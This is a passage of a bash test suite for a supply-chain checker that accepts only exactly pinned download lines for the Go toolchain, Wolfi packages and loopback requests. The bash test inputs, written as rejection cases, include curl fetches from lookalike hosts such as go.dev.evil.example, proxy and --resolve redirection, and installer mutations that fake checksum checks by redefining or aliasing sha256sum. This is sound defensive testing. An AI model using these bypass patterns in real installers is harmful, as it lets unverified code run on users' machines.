mkrowp "$work/lf-bad.json" bin/fetch.sh "curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x" "a fine fetch: "
edck lf-text "$work/lf-bad.json"
CASE="a download row with another ruling text rules nothing: exit 1"
check test "$rc" -eq 1
mkrowp "$work/lf-edit.json" bin/fetch.sh "curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x" "$LIVEP"
twoc lf-edit bin/fetch.sh $'#!/bin/sh\n' $'#!/bin/sh\ncurl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x --proxy http://p.example\n'
edck lf-edit "$work/lf-edit.json"
CASE="a live-fetch row voids when the line is edited (a proxy added): exit 1"
check test "$rc" -eq 1

# REQ-SUP-001-AC23: the second honored fetch shape, the Go toolchain tarball the refresh job archives (rule 12: Go kept in the archive; the committed recipe pins the file and its
# sha256, which the job verifies before storing). Honored only under its own ruling text, only for ONE curl with the fixed flags and the single operand https://go.dev/dl/ followed by one variable.
GOP='pinned toolchain fetch, advisor reading Oct 16 (rule 12, the recipe pin is verified before storing): '
GOFIX='-q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/$f"'
for v in "go-ok:curl $GOFIX \"https://go.dev/dl/\$f\" || die \"could not download the Go toolchain\" 1:0" \
         "go-ok-braced:curl $GOFIX \"https://go.dev/dl/\${f}\":0" \
         "go-ok-concatenated:curl $GOFIX \"https://go.dev/dl/\"\"\$f\":0" \
         "go-without-globoff:curl -q -fsSL --max-time 900 --proto =https --tlsv1.2 -o \"\$tmp/dl/\$f\" \"https://go.dev/dl/\$f\":1" \
         "go-literal-file-is-no-variable-shape:curl $GOFIX https://go.dev/dl/go1.27.2.linux-amd64.tar.gz:1" \
         "go-other-path:curl $GOFIX \"https://go.dev/other/\$f\":1" \
         "go-path-then-literal:curl $GOFIX \"https://go.dev/dl/\$f/x\":1" \
         "go-two-variables:curl $GOFIX \"https://go.dev/dl/\$a\$b\":1" \
         "go-variable-host:curl $GOFIX \"https://\$h/dl/\$f\":1" \
         "go-variable-in-authority:curl $GOFIX \"https://go.dev\$f\":1" \
         "go-host-lookalike:curl $GOFIX \"https://go.dev.evil.example/dl/\$f\":1" \
         "go-userinfo:curl $GOFIX \"https://go.dev@evil.example/dl/\$f\":1" \
         "go-port:curl $GOFIX \"https://go.dev:8443/dl/\$f\":1" \
         "go-http:curl $GOFIX \"http://go.dev/dl/\$f\":1" \
         "go-other-host:curl $GOFIX \"https://dl.google.com/go/\$f\":1" \
         "go-wolfi-line-under-the-go-ruling:curl $GOFIX \"https://packages.wolfi.dev/os/\$f\":1" \
         "go-second-operand:curl $GOFIX \"https://go.dev/dl/\$f\" https://go.dev/dl/other:1" \
         "go-default-expansion:curl $GOFIX \"https://go.dev/dl/\${f:-x}\":1" \
         "go-command-substitution:curl $GOFIX \"https://go.dev/dl/\$(cat /tmp/f)\":1" \
         "go-pipe-to-shell:curl $GOFIX \"https://go.dev/dl/\$f\" | tar xz:1" \
         "go-proxy-option:curl $GOFIX -x http://p.example:3128 \"https://go.dev/dl/\$f\":1" \
         "go-no-disable-first:curl -fsSL -g -o \"\$tmp/dl/\$f\" \"https://go.dev/dl/\$f\":1" \
         "go-disable-alias-for-q:curl --disable -fsSL -g --max-time 900 --proto =https --tlsv1.2 -o \"\$tmp/dl/\$f\" \"https://go.dev/dl/\$f\":1" \
         "go-globoff-alias-for-g:curl -q -fsSL --globoff --max-time 900 --proto =https --tlsv1.2 -o \"\$tmp/dl/\$f\" \"https://go.dev/dl/\$f\":1" \
         "go-single-quoted-url-is-a-literal-dollar:curl $GOFIX 'https://go.dev/dl/\$f':1" \
         "go-output-default-expansion:curl -q -fsSL -g --max-time 900 --proto =https --tlsv1.2 -o \"\${out-fallback}\" \"https://go.dev/dl/\$f\":1" \
         "go-output-command-word:curl -q -fsSL -g --max-time 900 --proto =https --tlsv1.2 -o \"\${out:-x}\" \"https://go.dev/dl/\$f\":1" \
         "go-single-quoted-output:curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o '\$tmp/dl/\$f' \"https://go.dev/dl/\$f\":1" \
         "go-single-quoted-braced-output:curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o '\${tmp}/dl/\$f' \"https://go.dev/dl/\$f\":1" \
         "go-output-command-substitution:curl -q -fsSL -g --max-time 900 --proto =https --tlsv1.2 -o \"\$(cat /tmp/o)\" \"https://go.dev/dl/\$f\":1" \
         "go-literal-wolfi-url-under-the-go-ruling:curl $GOFIX https://packages.wolfi.dev/os/wolfi-signing.rsa.pub:1" \
         "go-resolve-option:curl $GOFIX --resolve go.dev:443:10.0.0.1 \"https://go.dev/dl/\$f\":1" \
         "go-config-option:curl $GOFIX -K /tmp/cfg \"https://go.dev/dl/\$f\":1"; do
  nm=${v%%:*}; rest=${v#*:}; line=${rest%:*}; want=${rest##*:}
  mkrowp "$work/gf-$nm.json" bin/fetch.sh "$line" "$GOP"
  twoc "gf-$nm" bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$line"$'\n'
  edck "gf-$nm" "$work/gf-$nm.json"
  CASE="Go-toolchain fetch row, $nm: exit $want"
  check test "$rc" -eq "$want"
done
# the Go ruling is for scripts only (a *.sh file outside .github/): the same valid line, carried by a workflow step or a non-script file, is not ruled
GLW="curl $GOFIX \"https://go.dev/dl/\$f\""
mkrowp "$work/gf-in-workflow.json" .github/workflows/x.yml "$GLW" "$GOP"
twoc gf-in-workflow .github/workflows/x.yml $'name: x\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' $'name: x\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          '"$GLW"$'\n'
edck gf-in-workflow "$work/gf-in-workflow.json"
CASE="a Go-toolchain row for a workflow file rules nothing (scripts only): exit 1"
check test "$rc" -eq 1
# the two rulings do not lend each other their lines: a Go-shaped line under the Wolfi ruling, and a Wolfi-shaped line under the Go ruling, rule nothing
GL="curl $GOFIX \"https://go.dev/dl/\$f\""
mkrowp "$work/gf-under-live.json" bin/fetch.sh "$GL" "$LIVEP"
twoc gf-under-live bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$GL"$'\n'
edck gf-under-live "$work/gf-under-live.json"
CASE="a Go-toolchain line under the Wolfi live-fetch ruling rules nothing: exit 1"
check test "$rc" -eq 1
WL='curl -q -fsSL -g --max-filesize 65536 --max-time 60 --proto =https --tlsv1.2 -o "$tmp/dl/$f" "https://packages.wolfi.dev/os/$p"'
mkrowp "$work/gf-wolfi-under-go.json" bin/fetch.sh "$WL" "$GOP"
twoc gf-wolfi-under-go bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$WL"$'\n'
edck gf-wolfi-under-go "$work/gf-wolfi-under-go.json"
CASE="a Wolfi per-package line under the Go-toolchain ruling rules nothing: exit 1"
check test "$rc" -eq 1
mkrowp "$work/gf-edit.json" bin/fetch.sh "$GL" "$GOP"
twoc gf-edit bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$GL --proxy http://p.example"$'\n'
edck gf-edit "$work/gf-edit.json"
CASE="a Go-toolchain row voids when the line is edited (a proxy added): exit 1"
check test "$rc" -eq 1

# REQ-SUP-001-AC25: the third honored fetch shape, the single line of bin/loopback-get.sh that starts the fetch program for a loopback or token request. The checker pins the
# file and the sha256 of the whole line (as the ruling's only allowance), so any edit, any other file and any other line under the prefix rule nothing.
LRP='loopback fetch, advisor reading Oct 17 (REQ-SUP-001-AC25): '
LL="curl -q -g --noproxy '*' --proto \"=\$proto\" --max-redirs 0 \"\$@\" \"\$url\" || exit \$?"
for v in "lr-ok:bin/loopback-get.sh:$LL:0" \
         "lr-other-file:bin/fetch.sh:$LL:1" \
         "lr-other-name:bin/loopback-get2.sh:$LL:1" \
         "lr-edited-one-char:bin/loopback-get.sh:${LL/--max-redirs 0/--max-redirs 1}:1" \
         "lr-extra-option:bin/loopback-get.sh:${LL/-q -g/-q -g -k}:1" \
         "lr-other-line-same-file:bin/loopback-get.sh:curl -x http://p.example:3128 \"\$url\":1" \
         "lr-a-fetch-of-software:bin/loopback-get.sh:curl -q -fsSL -o /tmp/x https://example.com/x:1" \
         "lr-in-a-workflow:.github/workflows/x.yml:$LL:1"; do
  nm=${v%%:*}; r1=${v#*:}; file=${r1%%:*}; r2=${r1#*:}; line=${r2%:*}; want=${r2##*:}
  mkrowp "$work/$nm.json" "$file" "$line" "$LRP"
  twoc "$nm" "$file" $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$line"$'\n'
  edck "$nm" "$work/$nm.json"
  CASE="loopback fetch row, $nm: exit $want"
  check test "$rc" -eq "$want"
done
# the pinned line is the raw text, not its whitespace-normalised hash (round 1): a tab for the space, a carriage return, a second copy that only differs in whitespace, and a symlink named like the helper rule nothing
EDT=$'curl\t'"${LL#curl }"
for v in "lr-tab:${EDT}" "lr-cr:${LL}"$'\r' "lr-indent: ${LL}" "lr-double-space:${LL/-q -g/-q  -g}"; do
  nm=${v%%:*}; line=${v#*:}
  mkrowp "$work/$nm.json" bin/loopback-get.sh "$LL" "$LRP"
  twoc "$nm" bin/loopback-get.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$line"$'\n'
  edck "$nm" "$work/$nm.json"
  CASE="loopback fetch row, the line differs in whitespace ($nm): exit 1"
  check test "$rc" -eq 1
done
mkrowp "$work/lr-dup.json" bin/loopback-get.sh "$LL" "$LRP"
twoc lr-dup bin/loopback-get.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$LL"$'\n'"$EDT"$'\n'
edck lr-dup "$work/lr-dup.json"
CASE="loopback fetch row, the exact line plus a whitespace-variant copy: exit 1"
check test "$rc" -eq 1
mkrowp "$work/lr-link.json" bin/loopback-get.sh "$LL" "$LRP"
twoc lr-link bin/loopback-get.sh $'#!/bin/sh\n' "$LL"
( cd "$work/lr-link" && rm bin/loopback-get.sh && ln -s "$LL" bin/loopback-get.sh && printf '#!/bin/sh\n' > bin/target.sh && git add -A && git -c user.name=t -c user.email=t@x commit -q --amend --no-edit )
edck lr-link "$work/lr-link.json"
CASE="loopback fetch row, a symlink named bin/loopback-get.sh whose target is the line: exit 1"
check test "$rc" -eq 1
# the loopback prefix on a line of another form (a gh release download) in the helper's own file rules nothing either: every form, not only a download
python3 - "$work/lr-other-form.json" bin/loopback-get.sh "$LRP" <<'PY'
import hashlib, json, sys
H = lambda s: hashlib.sha256(s.encode()).hexdigest(); line = "gh release download v1 -R x/y"
json.dump({"exceptions": [], "unmeasured_text": [{"file": sys.argv[2], "form": "a gh release or extension download", "key": H(line), "line": H(line), "ruling": sys.argv[3] + "x"}]}, open(sys.argv[1], "w"))
PY
twoc lr-other-form bin/loopback-get.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n''gh release download v1 -R x/y'$'\n'
edck lr-other-form "$work/lr-other-form.json"
CASE="the loopback ruling prefix on a gh release download line of the helper file rules nothing: exit 1"
check test "$rc" -eq 1
# the prefix does not lend the line to the other rulings, and the other rulings do not lend theirs to the helper line
mkrowp "$work/lr-under-live.json" bin/loopback-get.sh "$LL" "$LIVEP"
twoc lr-under-live bin/loopback-get.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$LL"$'\n'
edck lr-under-live "$work/lr-under-live.json"
CASE="the helper line under the Wolfi live-fetch ruling rules nothing: exit 1"
check test "$rc" -eq 1
mkrowp "$work/lr-go-under.json" bin/fetch.sh "curl $GOFIX \"https://go.dev/dl/\$f\"" "$LRP"
twoc lr-go-under bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"curl $GOFIX \"https://go.dev/dl/\$f\""$'\n'
edck lr-go-under "$work/lr-go-under.json"
CASE="a Go-toolchain line under the loopback ruling rules nothing: exit 1"
check test "$rc" -eq 1

# REQ-SUP-001-AC26: nineteen script lines the checker pins by file and by the sha256 of the whole line (the assets of our own release, the pinned client image pull, and the
# fourteen localhost request lines of the four acceptance scripts), honored under one prefix. Anything else under the prefix, any edit, any other file rules nothing.
PFP='pinned fetch, advisor reading Oct 17 (REQ-SUP-001-AC26): '
mkrowpf() { # OUT FILE LINE PREFIX: like mkrowp, for the gh release form too (its key is the hash of the whole line)
  python3 - "$@" <<'PY'
import hashlib, json, re, sys
out, f, line, pref = sys.argv[1:5]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
flat = " ".join(line.split()); segs = [s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s)]
rows = [{"file": f, "form": "a download", "key": H(sg), "line": H(flat), "ruling": pref + "pinned by file and whole line"} for sg in dict.fromkeys(segs)] if segs else \
       [{"file": f, "form": "a gh release or extension download", "key": H(flat), "line": H(flat), "ruling": pref + "pinned by file and whole line"}]
json.dump({"exceptions": [], "unmeasured_text": rows}, open(out, "w"))
PY
}
RAL='gh release download "$rel" -D release-published'
K8L='docker pull -q curlimages/curl:8.11.1@sha256:c1fe1679c34d9784c1b0d1e5f62ac0a79fca01fb6377cdd33e90473c6f9f9a69 && docker tag curlimages/curl:8.11.1@sha256:c1fe1679c34d9784c1b0d1e5f62ac0a79fca01fb6377cdd33e90473c6f9f9a69 "$CLIENT_LOCAL"'
GML='curl -s localhost:18095/metrics > /tmp/metrics-cold.txt'
MVL='hdr=$(curl -s -u mvn:acceptance-secret -D - -o /dev/null -X PUT --data-binary @/tmp/mvn-oversized-probe.bin http://localhost:18099/maven/oversizedprobe)'
pf_case() { # NAME FILE LINE WANT : the line (as the head holds it) under a row for LINE, in FILE
  mkrowpf "$work/pf-$1.json" "$2" "$3" "$PFP"
  twoc "pf-$1" "$2" $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$3"$'\n'
  edck "pf-$1" "$work/pf-$1.json"
  CASE="pinned fetch row, $1: exit $4"
  check test "$rc" -eq "$4"
}
for v in "ra-ok:bin/release-assets.sh:$RAL:0" "gm-ok:bin/acceptance-gradle.sh:$GML:0" "mv-ok:bin/acceptance-maven-capped.sh:$MVL:0" \
         "ra-other-file:bin/other.sh:$RAL:1" "k8-other-file:bin/other.sh:$K8L:1" "gm-in-the-maven-script:bin/acceptance-maven.sh:$GML:1" "mv-in-the-gradle-script:bin/acceptance-gradle.sh:$MVL:1" \
         "ra-edited-one-char:bin/release-assets.sh:${RAL/-D release-published/-D release-publisheD}:1" "k8-edited-tag:bin/acceptance-k8s.sh:${K8L//8.11.1/8.11.2}:1" \
         "gm-edited-port:bin/acceptance-gradle.sh:${GML/18095/18096}:1" "gm-extra-flag:bin/acceptance-gradle.sh:${GML/curl -s/curl -s -k}:1" \
         "other-line-same-file:bin/acceptance-gradle.sh:curl -s http://localhost:18095/healthz:1" "software-fetch-same-file:bin/release-assets.sh:curl -fsSL -o /tmp/x https://example.com/x:1" \
         "in-a-workflow:.github/workflows/x.yml:$GML:1"; do
  nm=${v%%:*}; r1=${v#*:}; file=${r1%%:*}; r2=${r1#*:}; line=${r2%:*}; want=${r2##*:}
  pf_case "$nm" "$file" "$line" "$want"
done
GOL1='    curl -q -fsSL -g -o "$tmp/go.tgz" "https://go.dev/dl/${gofile}" || die "download failed: go toolchain"'
GOL2='  curl -q -fsSL -g -o "${dl}/published.json" "https://go.dev/dl/${jsonq}" || die "go.dev is unreachable: cannot read the published checksums" 1'
for v in "go1-ok:bin/install-scanner.sh:$GOL1:0" "go2-ok:bin/go-bump-open-pr.sh:$GOL2:0" "go1-in-the-other-file:bin/go-bump-open-pr.sh:$GOL1:1" \
         "go1-edited:bin/install-scanner.sh:${GOL1/-fsSL/-fsSLk}:1" "go2-other-host:bin/go-bump-open-pr.sh:${GOL2//go.dev/go.dev.example}:1"; do
  nm=${v%%:*}; r1=${v#*:}; file=${r1%%:*}; r2=${r1#*:}; line=${r2%:*}; want=${r2##*:}
  pf_case "$nm" "$file" "$line" "$want"
done
# the client image line holds a digest-pinned image too: with no age data its image item fails, so the ruling is judged by its own lines (both segments ruled, none left unmeasured)
mkrowpf "$work/pf-k8-ok.json" bin/acceptance-k8s.sh "$K8L" "$PFP"
twoc pf-k8-ok bin/acceptance-k8s.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$K8L"$'\n'
edck pf-k8-ok "$work/pf-k8-ok.json"
CASE="pinned fetch row, k8-ok: both segments of the client image line are ruled and none is left unmeasured"
check test "$(grep -c 'ruled text.*AC26' "$work/rt.out")" -eq 2; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 0
# the pinned line is the raw text: a tab, a carriage return, an indent, a doubled space, a second whitespace-variant copy and a link named like the file rule nothing
for v in "tab:${GML/curl /curl$'\t'}" "cr:${GML}"$'\r' "indent: ${GML}" "double-space:${GML/-s localhost/-s  localhost}"; do
  nm=${v%%:*}; line=${v#*:}
  mkrowpf "$work/pf-ws-$nm.json" bin/acceptance-gradle.sh "$GML" "$PFP"
  twoc "pf-ws-$nm" bin/acceptance-gradle.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$line"$'\n'
  edck "pf-ws-$nm" "$work/pf-ws-$nm.json"
  CASE="pinned fetch row, the line differs in whitespace ($nm): exit 1"
  check test "$rc" -eq 1
done
mkrowpf "$work/pf-dup.json" bin/acceptance-gradle.sh "$GML" "$PFP"
twoc pf-dup bin/acceptance-gradle.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$GML"$'\n'"${GML/curl /curl$'\t'}"$'\n'
edck pf-dup "$work/pf-dup.json"
CASE="pinned fetch row, the exact line plus a whitespace-variant copy: exit 1"
check test "$rc" -eq 1
mkrowpf "$work/pf-link.json" bin/release-assets.sh "$RAL" "$PFP"
twoc pf-link bin/release-assets.sh $'#!/bin/sh\n' "$RAL"
( cd "$work/pf-link" && rm bin/release-assets.sh && ln -s "$RAL" bin/release-assets.sh && printf '#!/bin/sh\n' > bin/target.sh && git add -A && git -c user.name=t -c user.email=t@x commit -q --amend --no-edit )
edck pf-link "$work/pf-link.json"
CASE="pinned fetch row, a symlink named bin/release-assets.sh whose target is the line: exit 1"
check test "$rc" -eq 1
CASE="the checker pins exactly nineteen lines in eight files: the release-assets line, the client image line, fourteen localhost request lines (3 + 4 + 4 + 3 in the four acceptance scripts) and three Go fetches"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); sys.modules["ac"] = ac; spec.loader.exec_module(ac)
n = {f: len(v) for f, v in ac.PINNED_FETCH.items()}
assert n == {"bin/release-assets.sh": 1, "bin/acceptance-k8s.sh": 1, "bin/acceptance-gradle.sh": 3, "bin/acceptance-gradle-capped.sh": 4, "bin/acceptance-maven.sh": 4, "bin/acceptance-maven-capped.sh": 3, "bin/install-scanner.sh": 1, "bin/go-bump-open-pr.sh": 2}, n
assert sum(len(v) for v in ac._PINNED_FETCH_SHA.values()) == 19
assert all("\r" not in l and l == l.rstrip() and "\t" not in l for v in ac.PINNED_FETCH.values() for l in v)
PY
# the vendor-folder list: six files that name the vendored folder for a reason are listed, any other new file that names it is still refused
for pth in bin/chain-check-scripts-test.sh bin/chain-install-witness-test.sh bin/chain-release-scripts-test.sh bin/check-govulncheck.py bin/install-scanner.sh bin/release-metadata.py; do
  vfile "vl-$(basename "$pth")" "$pth" "ls vendor/"
  CASE="a file on the vendor-folder list may name the vendored folder: $pth (exit 0)"
  check test "$rc" -eq 0
done
vfile vl-seventh bin/govulncheck-other-test.sh "ls vendor/"
CASE="a seventh file that names the vendored folder is still refused (exit 1)"
check test "$rc" -eq 1


# --- Go's own release passes only by the installer's own lines (owner ratified Oct 21 2026, REQ-SUP-001-AC27): the tool item `go` only, and only when bin/install-scanner.sh
# downloads it from https://go.dev/dl/ at its pinned version and pins the sha256 of both architectures and verifies the file; every other check still applies ----
gosc() {   # gosc VER [TRIVY] [mutation: nopin|nohost|noverify|twohosts|arm64only] -> an installer text
  local ver=$1 trivy=${2:-0.74.0} mut=${3:-}
  local host="https://go.dev/dl" ; [ "$mut" = nohost ] && host="https://dl.example.org/dl"
  printf '%s\n' '#!/usr/bin/env bash' "TRIVY_VER=$trivy" "GO_VER=$ver" 'case "$TOOL:$arch" in'
  [ "$mut" != caseglob ] || printf '%s\n' '  go:*) SUM="$GO_SHA256" ;;'
  printf '%s\n' "  go:x86_64|go:amd64) SUM=$(printf 'a%.0s' $(seq 64)) ;;"
  [ "$mut" = nopin ] || printf '%s\n' "  go:aarch64|go:arm64) SUM=$(printf 'b%.0s' $(seq 64)) ;;"
  [ "$mut" != nopin ] || printf '%s\n' "  go:aarch64|go:arm64) SUM= ;;"
  printf '%s\n' 'esac'
  if [ "$mut" = failoff ]; then printf '%s\n' 'pipeline_fail() { echo "::error::scanner installer: $*" >&2; }'
  else printf '%s\n' 'pipeline_fail() { echo "::error::scanner installer: $*  (PIPELINE failure - not a scan finding)" >&2; exit 1; }'; fi
  case $mut in
    verifyoff) printf '%s\n' 'verify() { # file' '  :' '}' ;;
    nocompare) printf '%s\n' 'verify() { # file' '  local got' "  got=\$(sha256sum \"\$1\" | cut -d' ' -f1)" '}' ;;
    sumreset) printf '%s\n' 'SUM=' 'verify() { # file' '  local got' "  got=\$(sha256sum \"\$1\" | cut -d' ' -f1)" '  [ "$got" = "$SUM" ] || pipeline_fail "${TOOL} checksum mismatch (got ${got}, pinned ${SUM}) - refusing to run an unverified scanner"' '}' ;;
    *) printf '%s\n' 'verify() { # file' '  local got' "  got=\$(sha256sum \"\$1\" | cut -d' ' -f1)" '  [ "$got" = "$SUM" ] || pipeline_fail "${TOOL} checksum mismatch (got ${got}, pinned ${SUM}) - refusing to run an unverified scanner"' '}' ;;
  esac
  [ "$mut" != gover2 ] || printf '%s\n' 'if [ "$arch" = amd64 ]; then GO_VER=1.27.4; fi'
  [ "$mut" != gofile2 ] || printf '%s\n' 'if [ "$arch" = amd64 ]; then gofile=go1.27.1.linux-amd64.tar.gz; fi'
  [ "$mut" != urlvar ] || printf '%s\n' 'mirror_url="https://mirror.example.org/go1.27.3.linux-amd64.tar.gz"' 'curl -fsSL -o "$tmp/other.tgz" "$mirror_url"'
  [ "$mut" != aria ] || printf '%s\n' 'aria2c -d "$tmp" https://mirror.example.org/go1.27.3.linux-amd64.tar.gz'
  [ "$mut" != forloop ] || printf '%s\n' 'for GO_VER in 1.27.2; do :; done'
  [ "$mut" != mapfile ] || printf '%s\n' "mapfile -t gofile <<< 'go1.27.2.linux-amd64.tar.gz'"
  [ "$mut" != scp ] || printf '%s\n' 'scp mirror.example.org:/releases/go1.27.3.linux-amd64.tar.gz "$tmp/go.tgz"'
  [ "$mut" != tgzvar ] || printf '%s\n' 'mirror_url="https://mirror.example.org/go.tgz"' 'curl -fsSL -o "$tmp/other.tgz" "$mirror_url"'
  [ "$mut" != scpvar ] || printf '%s\n' 'scp "mirror.example.org:/releases/${gofile}" "$tmp/other.tgz"'
  [ "$mut" != urlgofile ] || printf '%s\n' 'mirror_url="https://mirror.example.org/${gofile}"' 'curl -fsSL -o "$tmp/other.tgz" "$mirror_url"'
  [ "$mut" != printfv ] || printf '%s\n' 'printf -v "GO_VER" %s 1.27.4'
  [ "$mut" != declq ] || printf '%s\n' 'declare "GO_VER=1.27.4"'
  [ "$mut" != rsyncver ] || printf '%s\n' 'rsync "mirror.example.org:/r/go${GO_VER}.tar.gz" "$tmp/o.tgz"'
  [ "$mut" != shasum ] || printf '%s\n' 'sha256sum() { printf "%s  %s\n" "$SUM" "$1"; }'
  [ "$mut" != cutfn ] || printf '%s\n' 'cut() { cat; }'
  [ "$mut" != aliasmut ] || printf '%s\n' 'alias sha256sum=true'
  [ "$mut" != ifdef ] || printf '%s\n' 'if true; then sha256sum() { printf "%s  %s\n" "$SUM" "$1"; }; fi'
  [ "$mut" != spacedef ] || printf '%s\n' 'sha256sum ( ) { printf "%s  %s\n" "$SUM" "$1"; }'
  [ "$mut" != wrapall ] || printf '%s\n' '('
  [ "$mut" != fn2 ] || printf '%s\n' 'function verify { :; }'
  [ "$mut" != ifsum ] || printf '%s\n' 'if [ "$TOOL" = go ]; then SUM="$GO_SHA256"; fi'
  printf '%s\n' 'case "$TOOL" in' '  go)'
  [ "$mut" != inlinesub ] || printf '%s\n' '    :; ('
  [ "$mut" != subshell ] || printf '%s\n' '    ('
  printf '%s\n' '    gofile="go${GO_VER}.${A_GO}.tar.gz"' "    curl -q -fsSL -g -o \"\$tmp/go.tgz\" \"$host/\${gofile}\" || die \"download failed: go toolchain\""
  [ "$mut" = literal2 ] && printf '%s\n' '    curl -fsSL -o "$tmp/other.tgz" "https://mirror.example.org/go1.27.3.linux-amd64.tar.gz" || pipeline_fail "download failed"'
  [ "$mut" != multiline ] || printf '%s\n' '    curl -fsSL -o "$tmp/other.tgz" \' '      "https://mirror.example.org/go1.27.3.linux-amd64.tar.gz" || pipeline_fail "download failed"'
  [ "$mut" = twohosts ] && printf '%s\n' '    curl -fsSL -o "$tmp/go2.tgz" "https://mirror.example.org/go${GO_VER}.${A_GO}.tar.gz" || pipeline_fail "download failed"'
  [ "$mut" = noverify ] || printf '%s\n' '    verify "$tmp/go.tgz"'
  [ "$mut" != subshell ] || printf '%s\n' '    ) || :'
  [ "$mut" != inlinesub ] || printf '%s\n' '    ) || :'
  printf '%s\n' '    ;;' 'esac'
  [ "$mut" != wrapall ] || printf '%s\n' ') || :'
}
gocase() {   # gocase NAME BASE-TEXT HEAD-TEXT [extra head files via a python edit]
  local n=$1; rm -rf "$work/$n"; mkdir -p "$work/$n/bin"; printf '%s\n' "$2" >"$work/$n/bin/install-scanner.sh"
  git -C "$work/$n" init -q; git -C "$work/$n" add -A; git -C "$work/$n" -c user.name=t -c user.email=t@x commit -q -m base
  printf '%s\n' "$3" >"$work/$n/bin/install-scanner.sh"; git -C "$work/$n" add -A; git -C "$work/$n" -c user.name=t -c user.email=t@x commit -q -m head
}
GOB="$(gosc 1.27.2)"
gocase goage "$GOB" "$(gosc 1.27.3)"
runck goage
CASE="Go 1.27.3 moved in the installer, downloaded from go.dev with both sha256 pins and the verify call, passes the scan (exit 0) and says it is the ratified install form"
check test "$rc" -eq 0; check grep -q 'tool:go@1.27.3' "$work/goage.out"; check grep -qi 'ratified\|exempt' "$work/goage.out"
gocase gotrivy "$GOB" "$(gosc 1.27.2 0.75.0)"
runck gotrivy
CASE="another tool (trivy) moved as a plain pin in a tree that holds the Go install form is read like any other pin (exit 0)"
check test "$rc" -eq 0
gocase gobothmoved "$GOB" "$(gosc 1.27.3 0.75.0)"
runck gobothmoved
CASE="go and trivy moved together: both are named and accepted (exit 0), go by the install form"
check test "$rc" -eq 0; check grep -q 'ok   tool:trivy@0.75.0' "$work/gobothmoved.out"; check grep -q 'ok   tool:go@1.27.3' "$work/gobothmoved.out"
for mut in nohost nopin noverify twohosts verifyoff nocompare sumreset literal2 fn2 failoff caseglob ifsum multiline gover2 gofile2 urlvar aria forloop mapfile scp tgzvar scpvar urlgofile printfv declq rsyncver shasum cutfn aliasmut subshell ifdef spacedef wrapall inlinesub; do
  if [ "$mut" = scpvar ] || [ "$mut" = urlgofile ] || [ "$mut" = rsyncver ] || [ "$mut" = literal2 ] || [ "$mut" = multiline ] || [ "$mut" = urlvar ] || [ "$mut" = aria ] || [ "$mut" = scp ] || [ "$mut" = tgzvar ]; then gocase "gomut-$mut" "$(gosc 1.27.2 0.74.0 $mut)" "$(gosc 1.27.3 0.74.0 $mut)"; else gocase "gomut-$mut" "$GOB" "$(gosc 1.27.3 0.74.0 $mut)"; fi
  runck "gomut-$mut"
  case $mut in
    nohost) CASE="go downloaded from a host that is not go.dev is not the pinned install form: FAILS (exit 1)" ;;
    nopin) CASE="go whose arm64 sha256 pin is empty is not the pinned install form: FAILS (exit 1)" ;;
    noverify) CASE="go with no verify call on the download is not the pinned install form: FAILS (exit 1)" ;;
    twohosts) CASE="go with a second download from another host is not the pinned install form: FAILS (exit 1)" ;;
    verifyoff) CASE="go whose verify() does nothing is not the pinned install form: FAILS (exit 1)" ;;
    nocompare) CASE="go whose verify() computes the hash but never compares it is not the pinned install form: FAILS (exit 1)" ;;
    sumreset) CASE="go whose installer resets SUM outside the pinned rows is not the pinned install form: FAILS (exit 1)" ;;
    literal2) CASE="go with a second download of a literal Go archive name (present in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    fn2) CASE="go with a second verify definition (function verify { :; }) is not the pinned install form: FAILS (exit 1)" ;;
    failoff) CASE="go whose pipeline_fail no longer exits is not the pinned install form: FAILS (exit 1)" ;;
    caseglob) CASE="go with a glob case arm that assigns SUM before the pinned rows is not the pinned install form: FAILS (exit 1)" ;;
    ifsum) CASE="go with an inline if ...; then SUM=...; fi is not the pinned install form: FAILS (exit 1)" ;;
    multiline) CASE="go with a second Go download split over a continuation line (present in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    gover2) CASE="go with an inline GO_VER reassignment before the filename is built is not the pinned install form: FAILS (exit 1)" ;;
    gofile2) CASE="go with an inline gofile reassignment is not the pinned install form: FAILS (exit 1)" ;;
    urlvar) CASE="go with a second Go download through a URL held in a variable (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    aria) CASE="go with a second Go download through another downloader (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    forloop) CASE="go with a for GO_VER in ... binding is not the pinned install form: FAILS (exit 1)" ;;
    mapfile) CASE="go with a mapfile write of gofile is not the pinned install form: FAILS (exit 1)" ;;
    scp) CASE="go with an scp transfer of a Go archive (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
